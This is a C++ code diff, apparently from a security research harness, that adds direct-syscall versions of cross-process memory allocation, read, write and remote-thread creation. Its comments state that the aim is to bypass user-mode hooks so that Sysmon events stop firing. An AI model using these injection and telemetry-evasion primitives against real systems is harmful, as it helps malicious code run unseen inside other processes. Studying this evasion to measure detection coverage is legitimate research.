@@ -1,8 +1,9 @@
 #include "Memory.h"
 
 #include <vector>
-#include <iostream>	
+#include <iostream>
 #include "WinHandle.h"
+#include "DirectSyscall.h"
 
 #include <cstdint>
 #include <cstddef>
@@ -10,6 +11,12 @@
 #include <string_view>
 #include <optional>
 #include <Psapi.h>
+
+// Convenience: NT_SUCCESS is defined in ntdef.h / winternl.h; some SDK
+// configurations don't pull it in via <windows.h>. Provide our own.
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
+#endif
 
 namespace PT {
 	namespace Memory {
@@ -118,8 +125,36 @@ namespace PT {
 			return results;
 		}
 
+		// -----------------------------------------------------------------
+		// Cross-process memory primitives.
+		//
+		// Each primitive has two code paths:
+		//   * When DirectSyscall::IsEnabled() is true, we invoke the
+		//     Nt* function directly (the syscall instruction is emitted
+		//     from DirectSyscallStubs.asm). This bypasses every user-mode
+		//     hook on the kernel32/ntdll exports, including Sysmon's.
+		//   * Otherwise we call the Win32 wrapper as before. This is the
+		//     baseline behavior used by every attack manifest that does
+		//     not set the direct-syscall flag.
+		//
+		// Both paths reach the same kernel routine, so ETW-TI events fire
+		// identically. The observable difference is at the user-mode
+		// telemetry layer — Sysmon Event 8 / Event 10 / etc. stop firing
+		// under the direct-syscall path. This is the empirical basis for
+		// the RQ3 evasion axis: same primitive, same kernel event, but
+		// zero visibility to user-mode-hooked instrumentation.
+		// -----------------------------------------------------------------
+
 		std::optional<std::uintptr_t> allocate_memory(const WinHandle& process, std::size_t size, DWORD allocation_type, DWORD protect) {
 			if (!process) return std::nullopt;
+			if (PT::DirectSyscall::IsEnabled()) {
+				PVOID   base = nullptr;
+				SIZE_T  region = size;
+				NTSTATUS s = PT::DirectSyscall::NtAllocateVirtualMemory(
+					process.get(), &base, 0, &region, allocation_type, protect);
+				if (!NT_SUCCESS(s) || !base) return std::nullopt;
+				return reinterpret_cast<std::uintptr_t>(base);
+			}
 			LPVOID addr = VirtualAllocEx(process.get(), nullptr, size, allocation_type, protect);
 			if (!addr) {
 				return std::nullopt;
@@ -129,18 +164,35 @@ namespace PT {
 
 		bool free_memory(const WinHandle& process, std::uintptr_t address, std::size_t size, DWORD free_type) {
 			if (!process) return false;
+			// NtFreeVirtualMemory isn't wrapped by DirectSyscall (not on the
+			// evasion-relevant set — it doesn't fire anything Sysmon watches).
+			// Baseline VirtualFreeEx path both when direct syscalls are on and off.
 			return VirtualFreeEx(process.get(), reinterpret_cast<LPVOID>(address), size, free_type) != 0;
 		}
 
 		bool read_memory(const WinHandle& process, std::uintptr_t address, void* buffer, std::size_t size) {
 			if (!process) return false;
 			SIZE_T bytesRead = 0;
+			if (PT::DirectSyscall::IsEnabled()) {
+				NTSTATUS s = PT::DirectSyscall::NtReadVirtualMemory(
+					process.get(), reinterpret_cast<PVOID>(address), buffer, size, &bytesRead);
+				return NT_SUCCESS(s) && bytesRead == size;
+			}
 			return ReadProcessMemory(process.get(), reinterpret_cast<LPCVOID>(address), buffer, size, &bytesRead) && bytesRead == size;
 		}
 
 		bool write_memory(const WinHandle& process, std::uintptr_t address, const void* buffer, std::size_t size) {
 			if (!process) return false;
 			SIZE_T bytesWritten = 0;
+			if (PT::DirectSyscall::IsEnabled()) {
+				NTSTATUS s = PT::DirectSyscall::NtWriteVirtualMemory(
+					process.get(),
+					reinterpret_cast<PVOID>(address),
+					const_cast<PVOID>(buffer),
+					size,
+					&bytesWritten);
+				return NT_SUCCESS(s) && bytesWritten == size;
+			}
 			return WriteProcessMemory(process.get(), reinterpret_cast<LPVOID>(address), buffer, size, &bytesWritten) && bytesWritten == size;
 		}
 
@@ -159,6 +211,26 @@ namespace PT {
 		// Note: CreateRemoteThread can be used to execute code in the target process, but it has limitations (e.g., it may not work well with certain mitigations). For more advanced techniques, consider manual mapping or using APCs.
 		std::optional<WinHandle> create_thread(const WinHandle& process, std::uintptr_t start_address, void* parameter, DWORD creation_flags) {
 			if (!process) return std::nullopt;
+			if (PT::DirectSyscall::IsEnabled()) {
+				HANDLE threadHandle = nullptr;
+				// THREAD_ALL_ACCESS mirrors what CreateRemoteThread requests.
+				// The other args match ntdll's NtCreateThreadEx signature —
+				// CreateRemoteThread is a thin wrapper around it.
+				NTSTATUS s = PT::DirectSyscall::NtCreateThreadEx(
+					&threadHandle,
+					THREAD_ALL_ACCESS,
+					nullptr,               // ObjectAttributes: default
+					process.get(),
+					reinterpret_cast<PVOID>(start_address),
+					parameter,
+					creation_flags,        // CREATE_SUSPENDED etc. flow through
+					0,                     // ZeroBits
+					0,                     // StackSize (default)
+					0,                     // MaximumStackSize (default)
+					nullptr);              // AttributeList
+				if (!NT_SUCCESS(s) || !threadHandle) return std::nullopt;
+				return WinHandle(threadHandle);
+			}
 			DWORD threadId{0}; // Optionally, you can capture the thread ID if needed
 			HANDLE threadHandle = CreateRemoteThread(process.get(), nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(start_address), parameter, creation_flags, &threadId);
 			if (!threadHandle) {
